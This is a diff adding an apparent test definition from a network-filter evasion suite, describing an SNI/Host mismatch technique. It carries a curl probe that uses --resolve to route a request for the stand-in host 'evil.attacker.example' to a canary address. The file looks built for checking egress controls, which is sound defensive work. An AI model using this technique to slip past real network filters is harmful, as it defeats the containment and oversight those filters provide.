@@ -1,0 +1,15 @@
+id = "net-sni-host-mismatch"
+name = "SNI / Host mismatch via resolver override"
+category = "net"
+description = "Forces the connection to the canary address while the request carries a foreign hostname (curl --resolve). Filters that inspect only IP or only SNI see the allowed value; the HTTP layer routes by Host. Twin of the virtual-host confusion, driven from the resolver side."
+references = ["Domain fronting / SNI-Host mismatch class, widely documented against L7 filters"]
+
+probe = '''
+curl -s -o /dev/null \
+  --resolve "evil.attacker.example:@@CANARY_PORT@@:@@CANARY_HOST@@" \
+  "http://evil.attacker.example:@@CANARY_PORT@@/hit/@@TECH_ID@@/@@NONCE@@"
+'''
+
+[preconditions]
+bins = ["curl"]
+oracle = "canary"
